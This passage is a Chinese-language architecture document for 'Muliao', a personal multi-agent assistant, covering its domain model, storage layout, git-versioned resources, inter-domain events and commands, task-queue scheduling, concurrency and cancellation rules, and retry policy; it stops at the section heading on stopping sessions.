# Muliao 架构

个人多 agent 助手。后端 Python（FastAPI + pydantic-ai），前端 React PWA（可添加到 iOS 主屏并接收 Web Push）。单机部署，SQLite + 文件目录。

## 1. 领域概念

| 概念 | 含义 | 事实存放处（唯一来源） |
|---|---|---|
| Agent | 一个助手：模型、指令、私有记忆、私有 skill、工作目录。以系统生成、不可变的 `id`（12 位十六进制）标识——主键、目录名、URL、工具参数、配置引用都用它；`name` 只用于展示，可改、唯一（NFC 规范化，任意可见字符；不能取 `user`，模型按名称指派 issue 时它指用户，`naming.new_agent_name`）。删除进行中时记下发起者（`deleting_by`），不再出现在列表与名称解析里 | `agents` 表；私有资源在 `data/resources/agents/<id>/`，工作目录 `data/workspaces/<id>/` |
| Session | 某个 agent 的一段对话，由某个触发源创建。种类（`kind`）决定它的规则：顶层会话、公开 thread、私有 thread（第 7 节） | `sessions` 表 |
| Message | pydantic-ai `ModelMessage` 原样序列化 | `messages` 表（每行一条 ModelMessage） |
| Mail | 投进某个会话信箱、交给它的 agent 的一封信件：用户消息（含附件）、对挂起调用的回答、触发器与委派来的任务、后台任务与 thread 的事件、运行中检查。按到达顺序排列，记下用户是否在等它的回答、不透明的关联 id（委派来的信件以委派的 holder 为关联 id，会话据此结清）、幂等键、状态（排队 / 已处理 / 被丢弃）与处理它的那次运行 | `mail` 表 |
| Hold（占用） | 别的工作替某个会话在外面做的一项异步工作：后台任务 `job:<id>`、委派 `delegation:<发起会话>:<工具调用 id>`（holder 全局唯一）。状态 active / released / cleared，记下用户是否在等它的结局、`ask_agent` 的调用 id。委派的全部状态就是发起方的这条占用。行永久保留（随会话删除） | `session_holds` 表 |
| Task | 一个待执行的工作单元：`run`（会话的一次运行）、`compaction`（上下文压缩）、`reflection`（强制反思）、`deliver`（投递通知）、`event`（领域事件或定向命令的一次投递） | `tasks` 表 |
| Compaction | session 早期消息的摘要，之后发给模型的上下文用它代替 `through_message_id` 及之前的消息 | `compactions` 表 |
| Job | agent 在后台跑的一条 shell 命令：发起它的会话、命令、注入的 secret 名、pid、状态（运行中 / 退出 / 被结束 / 被中断）、退出码。永久保留 | `jobs` 表；输出在工作目录的 `jobs/<id>.log` |
| Skill | `SKILL.md`（YAML frontmatter: name, description + 正文）。公共 skill 与 agent 私有 skill | `resources/public/skills/<name>/`、`resources/agents/<id>/skills/<name>/` |
| Prompt | agent 自己的指令，或合并进所有 agent 的公共 prompt | `resources/agents/<id>/PROMPT.md`、`resources/public/PROMPT.md` |
| Memory | agent 私有记忆，一份有长度上限的 markdown | `resources/agents/<id>/MEMORY.md` |
| Reflection | 一次强制反思的完整消息与结论；每个 agent 一个检查点（反思到哪条消息） | `reflections`、`reflection_checkpoints` 表 |
| MCP server | agent 私有或公共的 MCP 连接配置，可引用 vault | `resources/{public,agents/<id>}/mcp/<name>.json` |
| Secret | 加密保存的密码/token，通过 key 引用；公共或 agent 私有 | `secrets` 表（Fernet 加密） |
| File | 对话里出现的文件：用户随消息发送的图片与附件、agent 用 `share_file` 发出的文件。写入后不可变，按 id 引用，引用形式唯一（`/api/files/<id>/<名称>`）；与消息相互独立，删除会话不删文件 | `files` 表（元数据）；内容按 sha256 存在 `data/files/` |
| Notification | 发给用户的一条通知：标题、正文、指向的会话（系统通知如前置检查告警没有）、是否未读。通知页列出它们，未读数就是导航与应用图标的角标；Web Push 是它的投递方式，每台设备（推送订阅）一个 deliver task，只引用通知与订阅，内容不另存一份 | `notifications` 表 |
| ModelUsage（用量） | 一次模型运行报告的 token 用量：时间、agent、会话（没有就为空）、运行类型（对话 / 压缩 / 反思 / 临时 agent）、模型、请求数与各项 token。只增不改，也不随 agent 与会话的删除而消失——它是账目 | `model_usage` 表 |
| Issue（issue） | 人与 agent 协作的一件事：标题、描述、状态、优先级、负责项目（owner agent，必填、不随指派变）、指派人（agent / 用户 / 无）、依赖的上游 issue（有向无环）、时间线（评论与属性变化）。处于 todo / in_progress 且上游都已完成时，每条动态投进被指派 agent 在这个 issue 上唯一的会话 | `issues`、`issue_activities`、`issue_dependencies` 表 |
| Trigger | 具名、持久的事件来源，把外部刺激变成投进某个会话信箱的一封信件；触发方式（定时、一次性、webhook……）多态实现。跑完不会再触发的归档（`finished_at`），离开列表但留下历史 | `triggers` 表 |

目录：

```
data/
  muliao.db
  vapid_private.pem            # Web Push 密钥，首次启动生成
  files/<sha前两位>/<sha256>   # 对话里的文件内容（元数据在 files 表），相同内容只存一份
  files/tmp/                   # 上传中的临时文件，启动时清空
  resources/                   # git 仓库：agent 能改的文本资源，每次修改提交一版（见 muliao.agents.resources）
    public/
      PROMPT.md                # 公共 prompt（合并进所有 agent）
      skills/<name>/SKILL.md   # 公共 skill
      mcp/<name>.json          # 公共 MCP server
    agents/<id>/
      PROMPT.md                # agent 的指令
      MEMORY.md                # 私有记忆
      skills/<name>/SKILL.md   # 私有 skill（同名时遮蔽公共 skill）
      mcp/<name>.json          # 私有 MCP server（同名时遮蔽公共的）
  workspaces/<id>/             # 文件工具与 shell 的工作目录（不做版本管理）
  tmp/                         # 临时 agent 的工作目录，用完即删
```

**资源的版本管理**：agent 能改的文本资源都存成文件，用一个 git 仓库（`data/resources/`）管理版本：每次修改提交一次，作者是 `user` 或做出修改的 agent 的 id；历史与回滚都来自 git（回滚 = 把旧版本内容写回并作为新的一次提交）。版本管理只管布局里的资源文件（`resources.RESOURCE_FILES`，唯一定义：各级 `PROMPT.md`、agent 的 `MEMORY.md`、`skills/<name>/SKILL.md`、`mcp/<name>.json`）。仓库也会被绕过工具写入：agent 有 shell 与文件工具，能直接改这些文件；进程在写入中途被杀也会留下写完未提交的变化。两者用同一个机制收敛：每次写入之前（先于读取当前内容）、以及启动时，把资源文件上的这类变化先单独提交为一次 reconcile（作者记为系统，含义是「来源不明的外部写入」），所以外部写入最迟在下一次任何资源写入时进入历史，也不会被并进下一个作者的提交。布局之外的东西（agent 放进 skill 目录的脚本、虚拟环境、嵌套仓库、临时文件）不进历史：历史只增不改，进去就删不掉，也不能让一个目录里的杂物让所有资源写入失败。工具说明要求 agent 只用工具改这些资源，局部修改用 `edit_skill`，不必整篇重写。被绕过工具改坏、读不出来的 skill 或 MCP 配置（`resources.CorruptResource`）只影响它自己：列出资源时跳过并单独交出（每次读到记 error 日志），skill 索引里逐项写明「已损坏、原因」，MCP 的写进运行上下文；直接读或局部修改它照样报错（`read_skill`、`edit_skill`、`mcp_set_enabled` 交还模型），删除只看文件在不在，坏的也删得掉；skill 整篇重写（`write_skill`）即修复，MCP 没有覆盖写入的入口，删掉重加（`CorruptResource.repair`，说明里写明怎么修）。坏的项不参与同名遮蔽（读不出来就不知道它是什么），所以坏掉的私有 skill 或 MCP 的同名公共项照常可见。管理界面在各列表下另行列出坏的项（`GET /api/skills/corrupt`、`/api/mcp/corrupt`），可以删除；`mcp_list` 带 `corrupt`。secret 不在这里——它们加密存在数据库的 vault 里，不需要版本管理。

用最终正确性换简化：文件与 git 不在数据库事务里，不追求两者的强一致。
- 换掉的：跨数据库与文件的分布式事务（例如删除 agent 时数据库行与资源目录同时成功）。
- 失败可见：每次写入（`ResourceRepo.update`）的读取—变换—写入—提交都在同一把锁里，任何一步失败都把涉及的路径在文件系统上还原成写入前的样子（写入前先保存旧内容，不依赖 git——失败的往往正是 git，比如锁被别的进程占用）并向上报错，所以「报错」等于「没有生效」，调用方可以放心重试；还原本身失败时记 error 并与原错误一起抛出，不声称已回滚，留下的修改由下次启动的 recover 提交；启动时把数据库里已删除、仓库里还留着目录的 agent 记为 warning。
- 可收敛：只有进程在写入中途被杀会留下不一致，由启动时（worker 开始之前）的 `ResourceRepo.recover` 统一收敛：删除 `.git` 下遗留的锁与半写的 `*.tmp`，把写完未提交的变化提交为一次 `reconcile`（作者记为系统，日志记录涉及的路径）。
- 代价可控：不一致只发生在进程被杀的那一刻，窗口持续到下次启动；孤儿目录只占空间、出现在 MCP 管理列表里，由人清理。仓库不受部署机全局 git 配置的 hook 与签名影响。

## 2. 领域与边界

### 2.1 领域

```
muliao/
  platform/        数据库、任务队列（actor 调度）、事件与定向命令、实时展示总线、运行中检查的节奏、shell、id
  agent_runtime/   模型注册表、指令组装、工具组合、pydantic-ai 的逐步驱动、消息约定、工作区工具的组成部分
  sessions/        会话：信箱、历史、运行、挂起的调用、占用、结清、委派与 thread、压缩、停止、删除、种类
  jobs/            后台任务
  agents/          agent 目录、资源仓库、自我改进工具、工具组目录
  usage/           模型用量：每次运行记一条，按时间范围汇总
  issues/          issue 看板：人与 agent 协作的事项，动态按状态与指派投进 agent 的 issue 会话
  speech/          语音输入：把界面录下的语音转成文字（可选，配置 [transcription] 才有）
  vault/  files/  reflection/  notifications/  triggers/
  api/             HTTP 适配
  container.py     组合根：构造领域、注册事件订阅、组装工具组；只做装配，不含业务规则
  schema.py        汇总全部领域的表（Alembic、迁移测试、单领域写入断言）
```

每个领域独占自己的表（`<domain>/tables.py`）；领域之间的引用只是不透明的 id，没有跨领域外键。`agent_runtime` 不是业务领域，是会话与反思共用的端口：把 pydantic-ai 的 loop 收在「从这段历史推进一步，告诉我发生了什么」后面（`AgentRuntime.run_steps` 与 `StepHooks`），会话领域只依赖这个端口与消息约定；以后自己写 loop 时改动限于这个端口的实现。工具一律通过领域接口做事，不碰表。

### 2.2 领域之间怎么通信

只有三种：

- **命令**：请另一个领域做一件事，是对方公开接口上的一次调用，在**对方自己的事务**里执行。通常同步调用。发送方先在自己的事务里提交了状态、又必须保证命令执行时，用**定向命令**（`Messaging.send_in`，第 3.4 节）持久化。
- **事件**：宣布自己发生了什么，与状态变化在同一个本地事务里持久化（outbox），每个订阅者至少收到一次（第 3.3 节）。**发起用命令，反应用事件。**
- **查询**：只读，经对方的公开接口，返回对方定义的数据结构（读模型，如 `AgentInfo`、`SessionInfo`），不是 ORM 对象。

**跨领域查询与事务**：数据库禁止嵌套事务，跨领域查询在被查领域自己的事务里取快照，调用方先查后写。**一个领域的写入判断不得依赖在同一事务里读到的别的领域的数据**，除非被查的事实不可变或只会单向变化——文件写入后不变；agent 只会从可用变为正在删除、再变为不存在；会话只会从存在变为删除；会话的发起方不变。这类事实可以在自己的写事务里经对方的公开函数检查（`agents.api.active_agent_in`、`sessions.api.session_in`、`sessions.api.receive_command_in`），检查与写入之间插不进相反的变化。

**接口里谁管事务**：领域公开接口里的写入一律是被调领域自己开事务的命令（如会话领域给后台任务的 `SessionWork.hold`），调用方不替它管事务。接收调用方事务 `s` 的公开函数只能是只读的查询，`tests/test_boundaries.py` 列出了经过审查的这几个；新增要先确认它只读。

**强一致只在一个领域内部**，并且尽量只在一个聚合（一个会话）内部。同时写多个会话的事务只有三种，都在会话领域内：委派的发出 `Threads.dispatch`（发起方的占用 + thread 的信件）与交回（thread 结清关联的事务里把结局投给发起方、释放占用），两者对称；以及删除会话（连同归它所有的私有 thread，并把公开 thread 的父会话置空）。不用 2PC：所有领域在同一个 SQLite 文件里，本地事务本来就原子；跨资源的地方（git 资源仓库、文件存储、进程、Web Push、模型接口）保持「失败可见 + 对账」。多步发起留下的中间状态只能留在拥有对账的领域里。

| 级别 | 范围 | 机制 | 例子 |
|---|---|---|---|
| 强一致 | 一个领域内 | 一个本地事务 | 保存一步并把它带上的信件记为已处理；投信并判断是否唤醒；委派投递；停止会话 |
| 最终一致 | 领域之间 | 事件 + 定向命令，处理器的写入与投递完成同一事务 | 运行结束 → 推送、反思调度；会话结清 → 委派交回结局；会话停止 → 结束后台任务、放弃委派；删除的清理 |
| 对账 | 数据库与外部资源之间，或多步发起的中间状态 | 失败可见 + 定期或启动时对账 | 资源仓库 recover、文件存储 recover、临时目录清理、重启时被中断的后台任务、信箱的唤醒与失败结清 |

每处最终一致的三条判据见第 18 节。

### 2.3 依赖规则

由 `tests/test_boundaries.py` 对源码的 import（含相对 import）做静态检查，`src/muliao` 下的目录不论有没有 `__init__.py` 都算领域（另列的平台、HTTP、迁移、构建产物除外）：

- 领域之间只能 import 对方的 `api` 模块（命令、查询、读模型）与 `events` 模块（它发布的事件、接收的定向命令）；不 import 别的领域的表，也不拿别的领域的 ORM 对象。
- `platform` 不 import 任何领域；领域不 import HTTP 适配层（`api/`）与组合根。
- 每个领域都有 `api.py`（`__all__` 只列公开接口），缺了测试就失败：在调用方事务里执行的公开函数（参数里有调用方的事务）只能是登记过的只读查询，这条检查只看得到 `api` 模块。领域内部在自己事务里的写入（如通知的 `_enqueue_in`）是私有的。平台不认识领域的词汇：任务种类、会话来源、LLM SDK 的异常都在各自的领域里（3.2、第 5 节）。
- HTTP 适配层经领域的 `api`（与 `events`）调用领域，另外可以 import 领域的 `tables`，把领域交给它的行序列化成响应（它是适配器，不是领域，不另造一套读模型）。它拿到的对象只有 `container.Container` 上的：各领域的门面（字段类型都由领域的 `api` 导出）、平台的展示事件流（`EventFeed`，只订阅）与任务列表（`TaskAdmin`）、服务的生命周期；窄接口（`TaskAdmin`、`RevisionHistory`、`EventFeed`、`ReflectionLog`）是只转发窄方法的包装对象，不是 Protocol 标注——项目不跑类型检查，标注挡不住 HTTP 层调到完整对象的别的方法。测试检查字段的声明类型，也检查运行时的值恰好是声明的类型；装配出的全部对象在 `container.Assembly`，服务入口只把它的 `container` 交给 HTTP 层，测试夹具直接持有 `Assembly`。业务规则（例如写私有资源前 owner 必须还可用、只发文件时用文件名作标题、启动时已存 agent 的模型与工具组必须可用）都在领域里，HTTP 层与组合根不另写一份。

**组合根没有构造环**：用到「停止会话」的领域（会话门面、委派工具、删除 agent 的会话清理）依赖端口 `sessions.halt.StopSession`，组合根交给它们的实现是 `sessions.halt.SessionStopper`，它由正在进行的运行的登记（`StoppableRuns`）与 `SessionHalt` 组成，先于消费者构造，消费者用同一份登记运行；要马上执行自己提交的投递的领域（会话、触发器、issue）拿的是 `platform.worker.RunNow` 端口，worker 由各领域的处理器组成、在最后构造，构造后绑定到端口，绑定之前调用当场报错。

经 `api` 的依赖无环、有方向：`files`、`agents`、`usage`、`speech` → `vault` → `agent_runtime` → `sessions` → `jobs`、`reflection`、`notifications`、`triggers`、`issues`（`tests/test_boundaries.py` 的 `LAYERS`：领域只能 import 更早一层的 `api`，同层与反向都不行；新增领域要在那里定层）。反向需要的查询（删除 agent 时查会话是否忙）由组合根注入函数。事件与定向命令不受这个方向限制（订阅方 import 发布方的 `events`），`events` 模块只放消息的数据形状。

**一个写事务只写一个领域的表**（外加平台的任务表，它是每个领域的 outbox）：`Database(check_writes=...)` 记下每个事务的 ORM 写入与 insert / update / delete 语句，测试的容器打开 `schema.single_domain_writes` 作为开发期断言。数据库层的级联（`ON DELETE CASCADE`）不在记录里，它们都在会话领域内部。

## 3. 平台

### 3.1 数据库

SQLite 只有一个写者，`Database.transaction()` 在进程内用锁串行化所有事务，换来无丢失更新、无 `SQLITE_BUSY`；代价是事务内不得做模型调用、网络 IO 等慢操作。嵌套开事务会立即报错。取消的规则见第 4 节。

### 3.2 任务队列即 actor 调度

`tasks` 表是持久化的任务队列，也是 actor 调度器：每个 task 带 `lane`，同一 lane 内严格 FIFO（更早的排队任务、或进行中的任务挡住后面的）、同一时刻最多一个 running；不同 lane 并发。平台只提供 lane 的机制，lane 名由用它的领域定义：会话领域的都在 `sessions/lanes.py`（会话 actor 的邮箱 `session:<id>`，运行、压缩都在这条 lane 上串行执行；`Receive` 与会话之外的工作各自的 lane），反思的 `reflection:<agent id>` 在反思领域，deliver 的 `deliver:<会话>:<设备>`（系统通知按 agent，没有 agent 的是 `deliver:system:<设备>`；设备是 endpoint 的摘要，lane 会进日志而 endpoint 是订阅凭据）在通知领域。别的领域不拼这些名字，要问会话忙不忙用会话领域的 `SessionActivity`。

- **任务种类**：`tasks.kind` 是不透明的字符串，由各领域定义（会话的 `run`、`compaction` 在 `sessions/lanes.py`，反思的 `reflection`、通知的 `deliver` 在各自的 service），在组合根为它登记处理器；平台只有自己的 `event`（`platform.tables.EVENT_TASK`），不枚举领域的种类。`tasks.agent_id` / `session_id` 是有意的例外：平台为「任务」页展示、按会话筛选（以及日志）而保留的归属引用，对平台是不透明的，平台不解释它们（是否属于哪个会话、会话忙不忙由会话领域判断）。登记时同一种类出现两次即报错（`platform.worker.register_handlers`），队列只接受登记过的种类（`TaskQueue.accept`，此后 `enqueue` 当场拒绝别的种类）。库里还没完成的 task 若是没有处理器的种类（如改名前写入的旧值），启动时记 error（`Assembly._check_task_kinds`）：它永远不会被领取，还挡住它的 lane，只能由人恢复处理器或在库里删掉它。
- **TaskHandler 接口**：每种 kind 一个实现，worker 只负责领取、调用、按结果记账，不关心 kind 的细节。处理器分两段：`execute` 做事（可以开自己的事务、调用别的领域的命令），返回的 `Commit` 与「task 记为完成」在同一个事务里提交（`TaskQueue.complete`）。task 不设总时限：一次运行跑多久由 agent 自己判断，卡住的单个调用由各自的时限兜底（`run_shell` 的 timeout、MCP 工具调用的读超时、web 工具与推送的请求时限、模型 HTTP 请求每次读的空闲时限等；持续慢速输出的流不受后者约束），会话轮次与临时 agent 整体靠用户停止。反思运行没有停止入口：失控时只能重启，并等它耗尽 `task_max_attempts`（反思只开放改资源的短工具，这种情况罕见）。
- **失败**：契约内的失败（第 5 节）按指数退避重试，上限 `task_max_attempts`；最终失败时处理器的 `failed_in` 在记下失败的同一事务里收尾（如把失败交回等着的会话）。「任务」页可查并可手动重试（沿用原 id，所以仍按原顺序；重试把尝试次数清零）。进程崩溃后启动时把 `running` 复位为 `pending`（`Worker._recover`），尝试次数已经用完的除外：任务自己会让进程退出时（例如它执行的命令重启了服务），恢复—重启—再恢复会无限循环下去、还一直占住它的 lane，这时按最终失败记账（同一个上限，收尾钩子照常执行，失败照常可见）。
- **保留**（`platform/retention.py`）：启动时与之后每天一次，删掉 7 天前已完成（done）的 `event`、`deliver` 任务（这两种由组合根交给它），它们完成后没有别的数据引用；failed 一律保留供排查与重试。`run` 不删：`mail.consumed_by` 指向它且 ON DELETE CASCADE，删了会连带删掉它处理过的信件与幂等键；`reflection`、`compaction` 量小，留着。
- **马上执行**（`Worker.run_now`）：发送方提交了一条定向命令或一个事件之后希望它马上生效时，在调用方的任务里经同一个执行边界执行这一条投递（只用于短小的 `event` 投递，不占 worker 的槽位）；此刻不可领取（lane 被挡住、已被领取）就交给 worker。调用方随时可能被取消（请求断开、调用它的运行被停止），被取消时在屏蔽作用域里把还在 running 的它放回 pending 再照常抛出——投递的写入与完成同一事务，重做是安全的。

### 3.3 事件：以投递任务作为 outbox

**发布一个事件 = 在发布方的本地事务里，为每个订阅者插入一条投递任务**（种类 `event`，payload 是事件类型、事件 id、接收方与数据；`Messaging.publish_in`）。状态变化与「一定会通知到订阅者」在同一个事务里。订阅者在组合根注册（事件类型 → 接收方名、处理器、lane）。处理器返回的 `Commit` 只写**自己领域**的表，与投递完成在同一个事务里提交，所以对自己领域是恰好一次。语义成立的前提：

1. 一个订阅者领域的状态只由它的投递 lane 写（单写者），否则「`execute` 里读、`Commit` 里写」是先查后写的竞态。
2. `Commit` 里不调用别的领域的命令。
3. 消息的数据不合法、接收方没有登记（例如跨版本部署）是存下的数据与代码不一致，投递直接失败（`CorruptState`），不重试。

**lane**：默认每个订阅者一条（`sub:<接收方>`），发给同一订阅者的投递按发布顺序逐条处理，不同订阅者之间并行。需要跨事件类型保序的订阅按对象分 lane，lane 名带订阅者的前缀：

- 通知领域把同一会话的 `RunEnded`、`SessionRead` 与 `SessionDeleted` 放在 `notifications:<会话>`；反思领域把同一 agent 的 `RunEnded` 与 `AgentDeleting` 放在 `reflection-events:<agent>`；会话领域的 `Receive` 在 `sessions.receive:<会话>`。

**顺序只对没有失败的投递成立**：最终失败的投递不挡同一条 lane 上之后的投递，人工重试时它排在已经处理过的投递之后。所以依赖顺序的处理器必须检查前置状态：通知的 `RunEnded` 在提交事务里确认会话还在，反思的 `RunEnded` 确认 agent 不在删除中，前置状态缺失时按契约内的情况跳过并记日志。其余处理器都按目标对象的当前状态判断（占用状态），乱序到达也收敛。

队头阻塞：一条投递暂时失败、按退避重试时会挡住同一 lane 的后续投递，所以处理器只执行短命令，不做长任务。可观测：每条投递记事件类型、事件 id、接收方；处理开始、结果、被丢弃的迟到结局都打结构化日志。

### 3.4 定向命令

命令通常同步调用。只有一种情况不够：**发送方先在自己的事务里提交了状态，之后必须保证一条指定的命令一定执行**。这时用 `Messaging.send_in(命令)`：在发送方的事务里插一条指定接收方的投递任务，与事件共用同一个 outbox、同一套重试与失败可见。现有五条：`WorkEnded` 与 `WorkCheckIn`（后台任务记下结局后给会话投信并释放占用；确认仍在运行时投检查信件；同一条按占用者的 lane `sessions.work:<holder>`，检查不会排在结束之后）、`StopThread`（会话的停止事务停下它委派出去的 thread，会话领域给自己的命令）、`Receive`（触发器记下触发后、issue 记下动态后投信，第 14、21 节）、`Notify`（触发器记下前置检查失败后发告警；issue 交给用户时发推送）。规则：先改了自己、又必须可靠通知确定的接收方时用定向命令，不用「自己订阅自己的事件」绕路。

**幂等**：处理器的写入与投递完成同一事务，对接收方领域恰好一次。会新建东西的会话命令还带幂等键（`mail.dedupe_key`，同一会话内唯一；委派的 holder 由工具调用 id 确定性派生），重放不重复投信。改状态的命令按目标的当前状态判断，天然幂等。

### 3.5 实时展示总线

`platform.bus.EventBus` 与 SSE 是展示加速，不是领域事件：不持久化、不保证送达。运行的展示事件归会话领域（`sessions.live`），任务状态事件归平台；`api/events.py` 把它们组合成 SSE 的 `ServerEvent`（第 17 节）。命名上区分：领域事件（domain event）与 SSE 推送（server event）。

## 4. 并发模型

结构化并发用 anyio（运行在 asyncio 后端上），ruff banned-api 禁止裸的 asyncio 任务与超时 API（`create_task`、`gather`、`wait`、`wait_for`、`shield`、`timeout`、`TaskGroup` 等，测试除外，唯一的例外见下）。测试用 anyio 的 pytest 插件，任务组可以跨 fixture 的 yield。

**异常的传播边界**：

1. **根任务组**（容器启动时开，关停 = 取消它）：只放「意外异常即进程退出」的循环——worker 调度循环、定时触发循环、信箱对账循环、运行中检查的循环、任务保留的循环。它们意外退出是 bug，进程退出交给进程管理器重启。
2. **每个任务一个边界**：worker 执行的每个 task 在自己的作用域里执行，边界上捕获异常并按队列规则记账（重试或失败），不向上传播，一个运行出错不影响别的运行。
3. **每个后台任务的监督者一个边界**：意外异常只记 error 日志，由后台任务的对账收敛（「监督意外结束」是契约内的情况）。

**取消**：

- 用户停止 = 不带消息地取消这次运行自己的原生任务（`sessions/stopping.py` 的 `StoppableRuns`，带 noqa 与说明的唯一例外）；关停取消的是外层，宿主收到后同样取消运行的任务再照原语义抛出。原因（实测）：pydantic-ai 把每个工具调用放进原生任务并 await 它，如果用 anyio 作用域停止运行，anyio 的取消消息传进工具任务，工具里的 anyio 任务组（如 shell）把它当成自己的取消吞掉，工具照常返回结果；不带消息的原生取消不会被误认。`tests/test_stopping.py` 固定了三种取消下工具都如实收到取消。
- anyio 的取消是电平触发的：作用域被取消后，里面每一次 await 都会再抛出取消。因此**被取消后还要 await 的清理一律放进屏蔽作用域并加时限**。
- **每个数据库事务**拿到锁之后整个屏蔽 anyio 的取消，取消在事务结束后生效；原生取消只在 `Database.exclusive` 里发出，那时没有事务在进行。不这样做时取消会打断语句，SQLAlchemy 作废连接、后台的关闭等不到结果，关停时卡住（实测）。交换：关停与外层取消要等进行中的事务做完。

**需要屏蔽的清理点**与超时后的收敛：

| 清理 | 超时或失败后 |
|---|---|
| 保存被停止的那一步（`steps.save_stopped`），每个事务都已屏蔽 | 两个事务之间赶上关停时，剩下的由队列恢复后续跑；停止事务照样关闭历史 |
| 后台任务启动失败后的清理 | 记 error 日志；行留在 running，检查的对账记为被中断 |
| 结束进程组并回收（后台任务、同步 shell、前置检查） | 记 error 日志；后台任务由对账或启动时记为被中断 |
| git 退出与失败写入后的撤销暂存 | git 被强杀；锁由下次启动的 recover 清理 |
| 临时 agent 工作目录删除 | 记 error 日志；启动时清空 `data/tmp` |
| `run_now` 被取消后把任务放回 pending | 记日志；任务留在 running 直到重启时 recover |

## 5. 核心数据流：一切都是 Task

我们在 pydantic-ai 消息上加的约定（工具结果 metadata 的键、停止标记、合成的工具结果、「调用是否已有结果」的定义）都登记在 `muliao.agent_runtime.conventions` 的模块说明里，解析也只在那里写一份；新增约定先在那里登记。

所有触发源只做一件事：**创建 session（或选中已有 session），往它的信箱投一封信件**（`inbound.receive` → `mailbox.post_in`）。消费信箱的运行是一条 `run` task，之后的执行、重试、反思、通知全部由同一个任务队列驱动，没有例外：`ask_agent` 也只是往私有 thread 的信箱投信，发问方停在这次调用上等回信（第 7 节「挂起的调用」）。

```
Web / 触发器（Receive 命令）/ delegate_task / ask_agent     后台任务与委派的结局、运行中检查
          │  inbound.receive(Inbound)                               │  deliver_in / post_check_in
          ▼                                                               ▼
       mail（会话信箱，mailbox.post_in）──── wake_in：需要时投递一次运行
          │
 tasks(run) ──► Worker ──► RunHandler ──► Consumer ──► AgentRuntime.run_steps（pydantic-ai 逐步驱动）
                                              │ 每一步一个事务：
                                              ├─ 请求模型之前：这次请求 + 它带上的信件（记为已处理）；上下文超过阈值就先压缩
                                              └─ 模型回复之后：这条回复
                                              │ 运行结束（与 task 记为完成同一事务，sessions.finish，只写会话自己的数据）：
                                              ├─ session.unread / updated_at
                                              ├─ 工作做完就结清委派来的关联，同一事务把结局交回发起方（sessions.delegation）
                                              ├─ 发布 RunEnded（通知领域推送，反思领域数步数）
                                              └─ 信箱里还有信件 → 下一次运行
```

- **删除约束**：会话或 agent 忙时拒绝删除（409），避免运行结果无处提交、工具写到被删的目录。**忙** = 会话（连同归它所有的私有 thread）的 lane 上有排队或运行中的任务（运行、压缩），或有 active 占用（后台任务、委派出去的工作）。界面上「停止」与「删除」是两步。
- **实时展示**：运行中的事件经进程内 EventBus 推到前端 SSE（形状见第 17 节「前后端契约」）：工具调用与结果是与历史同一个投影的会话条目（`transcript.call_item` / `result_item`，文字截断过），回答与思考是追加到同类最后一条的文字增量；运行时经 `StepHooks` 报告流式的文字、工具调用（参数已脱敏）与结果，会话领域投影并发布。数据库是唯一事实源，事件流只是展示加速。每一步保存后历史里就有了这一步，所以内存里只留当前这一段的事件（`sessions.live.LiveRuns`：一段从一次请求保存之后开始，包括模型的回复与它调用的工具，带这一段的 `run_id` 与递增的 `seq`），会话接口作为 `live` 给出，中途打开页面从这一段的开头看起；回复在执行工具之前就已保存，会话接口不在历史里重复显示这一段已经在展示的消息（`after_message_id`）。每保存一次请求就换一段并发 `saved` 事件，前端重新拉取历史；前端把快照与之后经 SSE 收到的事件按 `run_id` 与 seq 合并，丢掉别的段，发现缺口（快照先于订阅生成）就再拉取一次。运行结束（完成、失败、停止）时丢弃缓存。

### 用最终正确性换架构简化

换掉的：「每个触发点、每次模型调用、每次推送都必须当场成功」，以及领域之间的强一致（一次运行结束时把记完成、结清委派、给发起方投信、反思调度、推送放进一个跨领域的大事务）。

换来的：所有触发源、反思、通知、领域之间的反应共用一套「持久化 task + 重试 + 启动恢复」语义，没有各自的补偿逻辑；每个领域只在自己的事务里改自己的表。

三条判据：

1. **失败可见**：task 失败记录 `error`、打 error 日志，UI 的「任务」页可查并可手动重试；session 页显示最近一次运行失败；重试运行期间保留上一次的错误。
2. **可收敛**：契约内的失败（模型接口 408/409/425/429/5xx/529、底层为连接错误的 `ModelAPIError`、网络错误、超时、推送服务 5xx/429）按指数退避重试，上限 `task_max_attempts`。worker 只认 `TransientError` 与 `TimeoutError`，不认识任何 SDK：模型与网络层的暂时性失败由 agent_runtime 在一次模型运行的边界上换成 `TransientError`（`agent_runtime/transient.py`），推送、web 工具、MCP 等适配层各自抛 `TransientError`；进程崩溃后启动时把 `running` 复位为 `pending` 重新执行（恢复次数同样受 `task_max_attempts` 约束，见第 4 节）。运行**每一步保存**（这次请求与它带上的信件同一个事务、回复一个事务），收尾与 task 记为完成同一个事务，所以重试从上一步续跑：历史停在一条没得到回复的请求上就重发它，停在带工具调用的回复上就给那些没出结果的调用补上「被中断、没有重新执行」的结果再重发（见第 7 节「从哪里开始」），已经保存的步骤不会重放，也不会产生重复消息。领域之间的反应经事件投递，处理器的写入与投递完成同一事务（第 3.3 节）。
3. **代价可控**：中断那一步里正在执行的工具不重放（它的副作用是否已经发生无从知道，模型拿到「被中断」的结果自己判断），所以重复的副作用只来自一步之内的并行调用——同一次模型回复里的其他工具已经做完、结果还没保存时整步一起补结果，模型可能重做它们；`web` 工具按次计费，重做的搜索与抓取会再付一次费（抓取按目标域名限流时也可能再次撞上限流）。临时 agent 把「一步」撑得很大：它整个在调用方的一步里运行，一步里可能并行多条模型调用链，任何一条失败都会取消其余（已经做过的 shell 与 MCP 副作用留在那里）；这一步不会自动重放，模型拿到「被中断」的结果后自己决定要不要再做一遍。任何运行（会话轮次、反思、临时 agent）都不设请求数上限（显式传 `UsageLimits(request_limit=None)`，盖掉 pydantic-ai 默认的 50）：开发类任务一轮上百步是常态，也不设总时长（见 TaskHandler 接口）：跑多久由 agent 自己判断，会话轮次与临时 agent 靠用户停止收束（反思没有停止入口，同见该处）。Web Push 每个订阅（设备）一个 deliver task，只有 404/410（RFC 8030 的订阅失效）才删除订阅，其他 4xx 视为本端问题让该 task 失败、不删数据；暂时性失败只重试失败的那一台（各设备的 lane 互不阻塞），不会再推给已送达的设备；只有推送成功后、task 记为完成前进程崩溃，才会对这一台重推一次。领域之间的反应晚几百毫秒（推送、委派的结局、反思调度、删除后的清理）。

契约外的失败（代码 bug、模型返回 400、请求超限、响应解码失败、配置错误、存下的消息与代码不一致）不重试，task 直接 `failed` 并告警。

后台循环（worker、定时触发）意外退出视为 bug，进程直接退出交给进程管理器重启。单个定时触发器的数据不合法时只停用它并记录 `disabled_reason`，不影响其他触发器。

### 停止会话

